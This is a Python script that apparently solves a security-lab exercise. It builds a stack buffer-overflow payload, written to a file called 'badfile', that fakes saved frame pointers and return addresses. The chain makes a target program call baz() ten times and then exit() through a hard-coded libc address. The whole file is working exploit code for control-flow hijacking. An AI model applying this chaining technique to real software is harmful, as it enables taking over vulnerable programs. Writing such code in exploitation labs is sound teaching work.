#!/usr/bin/python3

def tobytes(value):
    return (value).to_bytes(4, byteorder="little")


def main():
    bar_addr    = 0x80485e1
    exit_addr   = 0xb7e369d0
    baz_addr    = 0x80485e1 + 3 # addr of baz() + 3 bytes (skip prologue)
    foo_ebp     = 0xbfffed18
    next_ebp    = foo_ebp
    skip_ebp    = 32            # leave room for up to 4 arguments
    offset      = 40            # distance between buffer start and ebp

    # Pad the offset of overflow string with an arbitrary value.
    content = bytearray(0xaa for i in range(offset))

    for i in range(10):
        next_ebp += skip_ebp            # jump address + skip value
        content += tobytes(next_ebp)    # ebp address skip_ebp bytes away
        content += tobytes(baz_addr)    # this is the return address
        content += tobytes(0xaabbccdd)  # baz() argument

        # Append arbitrary data to fill up rest of 32 byte space.
        content += bytearray(0xaa for i in range(skip_ebp - (3*4)))
        
    # Invoke exit() to exite gracefully at end.
    content += tobytes(0xffffffff)      # next ebp value never used
    content += tobytes(exit_addr)
    content += tobytes(0xaabbccdd)      # baz() argument

    # Write the string to a file.
    with open("badfile", "wb") as f:
        f.write(content)


if __name__ == "__main__":
    main()
